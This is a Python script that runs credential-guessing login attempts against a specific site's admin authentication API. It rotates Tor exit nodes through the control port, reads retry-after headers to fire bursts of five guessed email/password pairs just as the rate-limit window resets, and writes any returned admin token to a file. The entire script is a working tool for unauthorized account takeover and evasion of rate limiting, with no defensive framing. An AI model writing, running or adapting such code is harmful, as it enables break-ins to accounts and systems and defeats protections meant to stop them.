#!/usr/bin/env python3
"""Five curated credential trials per global 900s window, fresh Tor exit per burst.
Reads retry-after from 429 without consuming the window; waits; fires 5; logs result.
"""
import socket, subprocess, time, json, sys

CTRL=("127.0.0.1",9051); COOKIE="/tmp/tordata/control_auth_cookie"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
URL="https://ops.onlyfakeai.ru/api/auth/login"

CANDIDATES = [
    ("onlyfake@tuta.io", "Onlyfake123!"),
    ("onlyfake@tuta.io", "onlyfake123"),
    ("onlyfake@tuta.io", "Onlyfake1"),
    ("admin@onlyfakeai.ru", "Admin123!"),
    ("onlyfake@tuta.io", "onlyfake"),
]

def ctrl(cmd):
    s=socket.create_connection(CTRL,timeout=10)
    s.sendall(b"AUTHENTICATE "+open(COOKIE,"rb").read().hex().encode()+b"\r\n"); time.sleep(.15); s.recv(256)
    s.sendall(cmd+b"\r\n"); time.sleep(.2)
    try: return s.recv(1024)
    finally: s.close()

def login(email,password,timeout=45):
    t0=time.time()
    p=subprocess.run(["curl","-sS","-k","--socks5-hostname","127.0.0.1:9050","-m",str(timeout),"-A",UA,
        "-X","POST","-H","Content-Type: application/json",
        "-d",json.dumps({"email":email,"password":password}),
        "-o","/tmp/lb.bin","-D","/tmp/lh.txt","-w","%{http_code}",URL],capture_output=True,text=True)
    code=p.stdout.strip()
    try: body=open("/tmp/lb.bin","rb").read(500).decode("utf-8","replace")
    except Exception: body=""
    hdrs={}
    try:
        for line in open("/tmp/lh.txt",encoding="utf-8",errors="ignore"):
            if ":" in line:
                k,v=line.split(":",1); hdrs[k.strip().lower()]=v.strip()
    except Exception: pass
    return {"code":code,"body":body,"dt":round(time.time()-t0,2),"remaining":hdrs.get("ratelimit-remaining"),"retry_after":hdrs.get("retry-after")}

if __name__=="__main__":
    # 1) find current window state without consuming if locked
    ctrl(b"SIGNAL NEWNYM"); time.sleep(3)
    r=login("window-probe@example.com","x")
    print("window probe:",json.dumps(r),flush=True)
    wait=0
    if r["code"]=="429":
        try: wait=int(r["retry_after"] or 600)+5
        except Exception: wait=905
        print(f"locked; waiting {wait}s for global window reset...",flush=True)
        time.sleep(wait)
    # 2) fresh exit, fire the 5 candidates back-to-back
    ctrl(b"SIGNAL NEWNYM"); time.sleep(3)
    for email,pw in CANDIDATES:
        r=login(email,pw)
        safe={"email":email,"password":pw,**r}
        print(json.dumps(safe),flush=True)
        if r["code"]=="200":
            print("SUCCESS",flush=True)
            open("/tmp/ops_admin_token.json","w").write(json.dumps(json.loads(r["body"])) if r["body"].startswith("{") else r["body"])
            break
        time.sleep(2)
